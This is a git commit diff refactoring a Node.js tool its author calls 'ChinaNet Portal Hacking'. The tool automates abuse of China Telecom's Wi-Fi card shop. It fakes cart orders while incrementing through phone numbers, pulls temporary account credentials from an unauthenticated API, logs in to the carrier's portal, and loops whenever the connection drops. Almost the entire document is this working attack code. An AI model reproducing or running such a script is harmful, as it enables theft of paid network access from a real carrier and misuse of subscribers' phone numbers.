bee8cec54b37f9b0daa5eae99612121b7c55eb4d
Dolphin Wood <dolphin.w.e@gmail.com>
2014-08-28 19:12:19 +0800

    Refactored

--- CT-Hack/main.js
+++ CT-Hack/main.js
@@ -1,13 +1,3 @@
-/*!
- * ChinaNet Portal Hacking v0.0.4 by Dolphin @BUCT_SNC_SYS.
- * Copyright 2014 Dolphin Wood.
- * Licensed under http://opensource.org/licenses/MIT
- *
- * Designed and built with all the love in the world.
- *
- * Just typing iphoneNumber in shell to run it;
- * Everything will be done automatically :)
- */
 var http = require('http');
 var querystring = require('querystring');
 try {
@@ -16,257 +6,290 @@ try {
     console.warn('缺少 colors 模块');
 }
 
-function colorConsole(str, color) {
+var colorConsole = function (str, color) {
     // 彩色输出
     var colorful = str[color];
     if (!colorful)
         console.log(str);
     else
         console.log(colorful.bold);
-}
-
-function opt(path, cookie) {
-    // http req opt 读不到 prototype 值
-    this.host = 'wifi.189.cn';
-    if (path)
-        this.path = path;
-    if (cookie) {
-        this.headers = {};
-        this.headers.cookie = cookie;
-    }
-}
-
-var init = {
-    cookie: null,
-    phone: undefined,
-    NasType: 'Huawei',
-    NasName: 'BJ-JA-SR-1.M.ME60', // BUCT 默认值
-    tryConnect: function(callback) {
-        // 尝试连接，用于获取网关信息或测试网络连接
-        // 那就愉快地异步了吧~
-        var options = {
-            host: 'www.baidu.com',
-            path: '/index.html'
-        };
-        var req = http.get(options, function(res) {
-            if (callback && typeof(callback) === 'function')
-                return callback(res.statusCode); // 检测网络连接时不用进行下面的步骤
-            if (res.headers.location) {
-                // 获取到的重定向地址如：https://wlan.ct10000.com/portal/Huawei.redirect?NasName=BJ-JA-SR-1.M.ME60
-                var nasInfo = res.headers.location.split('/portal/')[1];
-                if (!nasInfo)
-                    return false;
-                var NasType = nasInfo.split('.')[0];
-                var NasName = nasInfo.split('NasName=')[1];
-                if (!NasType || !NasName)
-                    return false;
-                init.NasName = NasName;
-                init.NasType = NasType;
-                colorConsole('\n获取到的网关信息：NasType=' + NasType + '\tNasName=' + NasName + '\n', 'cyan');
-            }
-        });
-        req.on('error', function(e) {
-            colorConsole('请求出错: ' + e.message, 'red');
-            process.exit();
-        });
-    },
-    open: function() {
-        // 发起请求，得到 cookie
-        var path = '/service/index.jsp';
-        var options = new opt(path);
-        colorConsole('-->\n开始发起请求\n', 'yellow');
-        var req = http.get(options, function(res) {
-            res.setEncoding('utf8');
-            var cookie = res['headers']['set-cookie'][0].split(';')[0];
-            init.cookie = cookie;
-            colorConsole('获得的 cookie：' + cookie + '\n', 'cyan');
-            init.addGood(); // 触发 addGood 请求
-        });
-        req.on('error', function(e) {
-            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
-        });
-    },
-    addGood: function() {
-        // 向购物车添加物品
-        colorConsole('开始模拟向购物车添加物品...\n', 'yellow');
-        var path = '/service/cart.do?method=addGood&confirm=yes&cardId=1&type=1&count=1';
-        var options = new opt(path, init.cookie);
-        var req = http.get(options, function() {
-            init.list(); // 触发 list 请求
-        });
-        req.on('error', function(e) {
-            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
-        });
-    },
-    list: function() {
-        // 打开购物车，使请求有效化
-        colorConsole('打开购物车，使请求有效化...\n', 'yellow');
-        var path = '/service/cart.do?method=list';
-        var options = new opt(path, init.cookie);
-        var req = http.get(options, function() {
-            hack.getOrder(); // 触发 getOrder 请求
-        });
-        req.on('error', function(e) {
-            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
-        });
-    }
 };
 
-var hack = {
-    uname: undefined, // 账号
-    pwd: undefined, // 密码
-    secTry: false, // 同一个账号尝试两次登录
-    getOrder: function() {
-        // 获取订单号
-        var path = '/service/user.do?method=buy&confirm=yes&shopCartFlag=shopCart&cardType=1&cardPayType=yi&user_phone=&smsVerifyCode=&isBenJi=no&phone=' + init.phone + '&phone_1=' + init.phone;
-        var options = new opt(path, init.cookie);
-        colorConsole('开始获取订单号，手机号：' + init.phone + '...\n', 'yellow');
-        var req = http.get(options, function(res) {
-            res.setEncoding('utf8');
-            res.on('data', function(data) {
-                if (data[0] === '1') {
-                    var orderId = data.split(',')[1];
-                    colorConsole('得到的订单号：' + orderId + '\n', 'cyan');
-                    hack.getPwd(orderId); // 获取账号密码
-                } else {
-                    if (data.indexOf('购物车为空') !== -1)
-                        return init.tryConnect(), colorConsole('购物车为空，重新添加', 'magenta'); // 若没进行购物车添加，则返回重试
-                    colorConsole(data.split(',')[1] + ' || 没有得到订单号，继续下一组尝试...\n', 'grey');
-                    hack.getOrder(); // 获取数据出错则递增重试
-                }
-            });
-        });
-        req.on('error', function(e) {
-            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
-        });
-        process.send(++init.phone); // 为下次计算做准备
-    },
-    getPwd: function(orderId) {
-        // 获取帐密
-        colorConsole('开始获取账号密码...\n', 'yellow');
-        var path = '/clientApi.do?method=get10mCard&orderId=' + orderId;
-        var options = new opt(path); // 此处不能带有 cookie
-        var req = http.get(options, function(res) {
-            res.setEncoding('utf8');
-            res.on('data', function(data) {
-                colorConsole('收到的数据：' + data + '\n', 'cyan');
-                if (data.indexOf('次数过多') !== -1)
-                    return false;
-                var t = data.split(','); // 获取有效信息
-                if (t[4] && t[5]) {
-                    hack.uname = t[4]; // uname
-                    hack.pwd = t[5]; // pwd
-                    hack.hackLogin(hack.uname, hack.pwd);
-                } else {
-                    colorConsole('未获取到，开始下一组尝试...\n', 'grey');
-                    hack.getOrder();
-                }
-            });
-        });
-        req.on('error', function(e) {
-            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
-        });
-    },
-    hackLogin: function(uname, pwd) {
-        // 登录
-        var info = {
-            username: uname,
-            password: pwd,
-            validateCode: '',
-            postfix: '@wlan.sh.chntel.com',
-            address: 'sh',
-            loginvalue: 'null',
-            basePath: 'http://wlan.ct10000.com:80/portal/',
-            language: 'CN_SC',
-            longNameLength: 32,
-            NasType: init.NasType,
-            NasName: init.NasName,
-            OrgURL: 'null',
-            isMobileRand: false,
-            isNeedValidateCode: false
-        }; // 登录表单，似乎所有项目都不能少
-        var contents = querystring.stringify(info);
+var httpPost = (function (querystring, http) {
+    // 发起 POST 请求
+    var createOpt = function (opt) {
         var options = {
-            host: 'wlan.ct10000.com',
-            path: '/portal/login4V2.do',
-            method: 'POST', // 呃，虽然 GET 也可以啦~
+            method: 'POST',
+            host: opt.host || 'wifi.189.cn',
+            path: opt.path || './',
             headers: {
                 'Content-Type': 'application/x-www-form-urlencoded',
-                'Content-Length': contents.length
+                'Content-Length': querystring.stringify(opt.contents).length
             }
         };
-        colorConsole('开始登录...\n', 'yellow');
-        var req = http.request(options, function(res) {
+        if (opt.cookie) {
+            options.headers.cookie = opt.cookie;
+        }
+        return options;
+    };
+
+    var post = function (opt, cb) {
+        var req = http.request(createOpt(opt), function (res) {
             res.setEncoding('utf8');
-            var output;
-            res.on('data', function(data) {
+            var output = '';
+            res.on('data', function (data) {
                 output += data;
-            }).on('end', function() {
-                var isConnected = output.indexOf('passwd error'); // 登录失败会返回含有此字符串的网页
-                if (isConnected === -1) {
-                    var time = new Date();
-                    colorConsole('登录成功！八分钟后开始检查连接状态\t' + time.toTimeString().slice(0, 8) + '\n\n======= Hacked By Dolphin With Node.js =======\n', 'green');
-                    hack.secTry = false; // 重置计数
-                    setTimeout(function() {
+            }).on('end', function () {
+                cb(res, output);
+            });
+        });
+
+        req.on('error', function (e) {
+            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
+            reconnect();
+        });
+
+        req.write(querystring.stringify(opt.contents)); // 写入请求内容
+        req.end();
+    };
+
+    return post;
+})(querystring, http);
+
+var checkNet = (function (httpPost) {
+    var check = function (cb) {
+        // 检测网络是否连接上
+        httpPost({
+                host: 'www.baidu.com',
+                path: '/index.html'
+            },
+            function (res) {
+                if (res.statusCode !== 200) {
+                    colorConsole('网络断开，开始下一组尝试...\n', 'grey');
+                    cb(true);
+                } else
+                    setTimeout(check, 10000); // 每十秒检测一次
+            });
+    };
+
+    return check;
+})(httpPost);
+
+var linkStart = (function (httpPost, checkNet) {
+    var init = {
+        cookie: null,
+        phone: undefined
+    };
+
+    var openReq = function (phone) {
+        // 发起请求，得到 cookie
+        colorConsole('\n-->\n开始发起请求', 'yellow');
+
+        init.phone = init.phone || phone;
+
+        if (init.cookie) return addGood(); // 已存在 cookie 则直接进行下一步
+
+        httpPost({
+                path: '/service/index.jsp'
+            },
+            function (res) {
+                var cookie = res['headers']['set-cookie'][0].split(';')[0];
+                init.cookie = cookie;
+                colorConsole('获得的 cookie：' + cookie + '\n', 'cyan');
+                addGood(); // 触发 addGood 请求
+            });
+    };
+
+    var addGood = function () {
+        // 向购物车添加物品
+        colorConsole('开始模拟向购物车添加物品...\n', 'yellow');
+
+        var options = {
+            path: '/service/cart.do',
+            cookie: init.cookie,
+            contents: {
+                method: 'addGood',
+                confirm: 'yes',
+                cardId: 1,
+                type: 1,
+                count: 1
+            }
+        };
+
+        httpPost(options, list);
+    };
+
+    var list = function () {
+        // 打开购物车，使请求有效化
+        colorConsole('打开购物车，使请求有效化...\n', 'yellow');
+
+        var options = {
+            path: '/service/cart.do',
+            cookie: init.cookie,
+            contents: {
+                method: 'list'
+            }
+        };
+
+        httpPost(options, getOrder);
+    };
+
+    var getOrder = function () {
+        // 获取订单号
+        colorConsole('开始获取订单号，手机号：' + init.phone + '...\n', 'yellow');
+
+        var options = {
+            path: '/service/user.do',
+            cookie: init.cookie,
+            contents: {
+                method: 'buy',
+                confirm: 'yes',
+                shopCartFlag: 'shopCart',
+                cardType: 1,
+                cardPayType: 'yi',
+                user_phone: '',
+                smsVerifyCode: '',
+                isBenJi: 'no',
+                phone: init.phone,
+                phone_1: init.phone
+            }
+        };
+
+        httpPost(options, function (res, data) {
+            console.log(data);
+            if (data[0] === '1') {
+                // 得到订单号，开始尝试登录
+                var orderId = data.split(',')[1];
+                colorConsole('得到的订单号：' + orderId + '\n', 'cyan');
+                return getPwd(orderId);
+            } else {
+                if (data.indexOf('购物车为空') !== -1) {
+                    // 若没进行购物车添加，则重新发起请求
+                    colorConsole('购物车为空，重新添加', 'magenta');
+                    return list();
+                }
+                // 否则递增电话号码重试
+                colorConsole(data.split(',')[1] + ' || 没有得到订单号，继续下一组尝试...\n', 'grey');
+                return getOrder();
+            }
+        });
+
+        ++init.phone; // 为下次计算做准备
+    };
+
+    var getPwd = function (orderId) {
+        // 获取帐密
+        colorConsole('开始获取账号密码...\n', 'yellow');
+
+        var options = {
+            path: '/clientApi.do',
+            contents: {
+                method: 'get10mCard',
+                orderId: orderId
+            }
+        };
+
+        httpPost(options, function (res, data) {
+            colorConsole('收到的数据：' + data + '\n', 'cyan');
+            if (data.indexOf('次数过多') !== -1)
+                return false;
+            var t = data.split(','); // 获取有效信息
+            if (t[4] && t[5]) {
+                hackLogin(t[4], t[5]);
+            } else {
+                colorConsole('未获取到，开始下一组尝试...\n', 'grey');
+                getOrder();
+            }
+        });
+    };
+
+    var hackLogin = (function () {
+        var isSecondTry = false; // 两次尝试计数
+
+        var login = function (uname, pwd) {
+            // 登录
+            colorConsole('开始登录...\n', 'yellow');
+
+            var options = {
+                host: 'wlan.ct10000.com',
+                path: '/portal/login4V2.do',
+                contents: {
+                    username: uname,
+                    password: pwd,
+                    validateCode: '',
+                    postfix: '@wlan.sh.chntel.com',
+                    address: 'sh',
+                    loginvalue: 'null',
+                    basePath: 'http://wlan.ct10000.com:80/portal/',
+                    language: 'CN_SC',
+                    longNameLength: 32,
+                    NasType: 'Huawei',
+                    NasName: 'BJ-JA-SR-1.M.ME60', // BUCT 默认值
+                    OrgURL: 'null',
+                    isMobileRand: false,
+                    isNeedValidateCode: false
+                } // 登录表单，似乎所有项目都不能少
+            };
+
+            httpPost(options, function (res, data) {
+
+                if (data.indexOf('passwd error' /* 登录失败会返回含有此字符串的网页*/ ) === -1) {
+
+                    colorConsole('登录成功！八分钟后开始检查连接状态\t' + new Date().toTimeString().slice(0, 8) + '\n\n======= Hacked By Dolphin With Node.js =======\n', 'green');
+
+                    isSecondTry = false; // 重置计数
+
+                    setTimeout(function () {
                         colorConsole('开始检查网络连接...\n', 'magenta');
-                        hack.checkDelay();
+                        checkNet(function (isOffline) {
+                            if (isOffline) openReq();
+                        });
                     }, 480000); // 八分钟触发定时器
+
                 } else {
-                    if (hack.secTry) {
+                    if (isSecondTry) {
                         // 两次登录都失败就放弃吧
                         colorConsole('第二次登录失败，开始下一组尝试...\n', 'grey');
-                        hack.secTry = false; // 重置计数
-                        hack.getOrder();
+                        isSecondTry = false; // 重置计数
+                        getOrder();
                     } else {
                         // 电信渣服务器可能不能即时处理分配到的账号密码
                         colorConsole('登录失败，3s 后再次尝试登录...\n', 'magenta');
-                        setTimeout(function() {
-                            hack.secTry = true; // 标记第二次尝试
-                            hack.hackLogin(hack.uname, hack.pwd);
+                        setTimeout(function () {
+                            isSecondTry = true; // 标记第二次尝试
+                            login(uname, pwd);
                         }, 3000);
                     }
                 }
             });
-        });
-        req.on('error', function(e) {
-            colorConsole('登录出错: ' + e.message + ',请检查网络连接\n', 'red');
+        };
+
+        return login;
+    })();
+
+    return openReq;
+})(httpPost, checkNet);
+
+var reconnect = (function (linkStart) {
+    var count = 0;
+
+    var connect = function () {
+        if (count > 10) {
+            // 十次尝试失败退出进程
+            colorConsole('重连失败，进程即将退出');
             process.exit();
-        });
-        req.write(contents); // 写入请求内容
-        req.end();
-    },
-    checkNet: function(callback) {
-        // 检测网络是否连接上
-        if (!callback || typeof(callback) !== 'function')
-            return false;
-        init.tryConnect(function(statusCode) {
-            if (statusCode !== 200) {
-                colorConsole('网络断开，开始下一组尝试...\n', 'grey');
-                hack.getOrder(); // 网络断开，开始新的计算
-                callback(true);
-            } else
-                callback(false);
-        })
-    },
-    checkDelay: function() {
-        // 定时检测网络连接状态
-        hack.checkNet(function(isOffLine) {
-            if (!isOffLine)
-                setTimeout(hack.checkDelay, 1000);
-        });
-    }
-};
-process.on('message', function(status) {
-    init.phone = status.phone;
-    if (status.crashed) {
-        colorConsole('\n主进程已重新启动！\n', 'yellow');
-        colorConsole('\n开始检测网络连接\n', 'green');
-        hack.checkDelay();
-    } else {
-        init.tryConnect();
-        init.open();
-    }
-}).on('uncaughtException', function(err) {
+        }
+        setTimeout(linkStart, count * 3000);
+        colorConsole(++count * 3 + '秒后尝试重连', 'red');
+    };
+
+    return connect;
+})(linkStart);
+
+// 进程会话
+process.on('message', function (phone) {
+    linkStart(phone);
+}).on('uncaughtException', function (err) {
     // 异常抛出
     colorConsole('Uncaught Exception ' + err, 'red');
     process.exit();
--- CT-Hack/mother.js
+++ CT-Hack/mother.js
@@ -1,71 +1,54 @@
 /*
  * Mother Processing
  */
-console.log('\u001b[33m/*!\n* ChinaNet Portal Hacking v0.0.4 by Dolphin @BUCT_SNC_SYS.\n* Copyright 2014 Dolphin Wood.\n* Licensed under http://opensource.org/licenses/MIT\n*\n* Designed and built with all the love in the world.\n*\n* Just typing Phone Number in shell to run it;\n* Everything will be done automatically :)\n*/\n\u001b[39m' /* yellow */ );
+console.log('\u001b[33m/*!\n* ChinaNet Portal Hacking v0.1.0 by Dolphin @BUCT_SNC_SYS.\n* Copyright 2014 Dolphin Wood.\n* Licensed under http://opensource.org/licenses/MIT\n*\n* Designed and built with all the love in the world.\n*\n* Just typing Phone Number in shell to run it;\n* Everything will be done automatically :)\n*/\n\u001b[39m' /* yellow */ );
 console.log('\u001b[1m\u001b[35m进程守护已启动！\n\u001b[39m\u001b[22m' /* cyan */ );
-var status = {
-    phone: undefined,
-    crashed: false
-}
+
 var child = require('child_process');
 var input = process.stdin;
 var output = process.stdout;
-var count = 1;
+var crashed = false;
 
-function io() {
+var connect = function (phone) {
+    input.pause();
+    hack = child.fork('./main.js');
+    hack.on('data', function (data) {
+        // 同步输出
+        console.log(data);
+    }).on('exit', function () {
+        delete hack;
+        crashed = true;
+        soutput.write('\u001b[35m\u001b[1m\n检测到主进程退出！\u001b[22m\u001b[39m\n是否重启进程（Y/N）');
+        input.resume(); // 恢复输入监听
+    }).send(phone);
+};
+
+(function (connect) {
     // 获取输入值
     input.resume();
     input.setEncoding('utf8');
     output.write('\u001b[36m\u001b[1m请输入11位手机号: \u001b[22m\u001b[39m' /* cyan */ );
-    input.on('data', function(text) {
+    input.on('data', function (text) {
         text = text.trim();
-        if (status.crashed) {
+        if (crashed) {
             // 进程中断
             var T = text.toUpperCase();
             if (T === "Y") {
                 console.log('\u001b[33m\u001b[1m\n正在重启主进程...\u001b[22m\u001b[39m');
-                status.phone++;
-                clearTimeout(restart); // 清空计时器
-                return start(), input.pause(); // 重启进程
+                return connect(), input.pause(); // 重启进程
             } else if (T === "N") {
                 process.exit();
             } else {
-                clearTimeout(restart);
                 return output.write('\n是否重启进程（Y/N）：');
             }
         }
-        if (text.length !== 11)
-            return console.log('\u001b[31m\u001b[1m手机号长度不对！\u001b[22m\u001b[39m\n' /* red */ ), output.write('\u001b[36m\u001b[1m请输入11位手机号: \u001b[22m\u001b[39m');
-        if (/[^\d]/g.test(text))
-            return console.log('\u001b[31m\u001b[1m手机号格式不正确！\u001b[22m\u001b[39m\n'), output.write('\u001b[36m\u001b[1m请输入11位手机号: \u001b[22m\u001b[39m');
-        status.phone = parseInt(text, 10); // 存储手机号
-        start(); // 开始建立子进程
-    })
-}
-
-function start() {
-    input.pause();
-    hack = child.fork('./main.js');
-    hack.on('data', function(data) {
-        // 同步输出
-        console.log(data);
-    }).on('message', function(phone) {
-        // 同步手机号
-        status.phone = phone;
-        status.crashed = false;
-    }).on('exit', function() {
-        delete hack;
-        status.crashed = true;
-        if (count <= 10) {
-            output.write('\u001b[35m\u001b[1m\n检测到主进程退出！\u001b[22m\u001b[39m\n是否重启进程（Y/N）\u001b[90m\u001b[1m ' + count * 3 + '秒后自动重启\u001b[22m\u001b[39m：');
-            restart = setTimeout(start, count * 3000);
-            count++;
-        } else {
-            count = 1;
-            output.write('\u001b[35m\u001b[1m\n检测到主进程退出！\u001b[22m\u001b[39m\n是否重启进程（Y/N）：');
+        if (text.length !== 11) {
+            return output.write('\u001b[31m\u001b[1m手机号长度不对！\u001b[22m\u001b[39m\n\u001b[36m\u001b[1m请输入11位手机号: \u001b[22m\u001b[39m');
         }
-        input.resume(); // 恢复输入监听
-    }).send(status);
-}
 
-io();
+        if (/[^\d]/g.test(text)) {
+            return output.write('\u001b[31m\u001b[1m手机号格式不正确！\u001b[22m\u001b[39m\n\u001b[36m\u001b[1m请输入11位手机号: \u001b[22m\u001b[39m');
+        }
+        connect(parseInt(text, 10)); // 开始建立子进程
+    })
+})(connect);
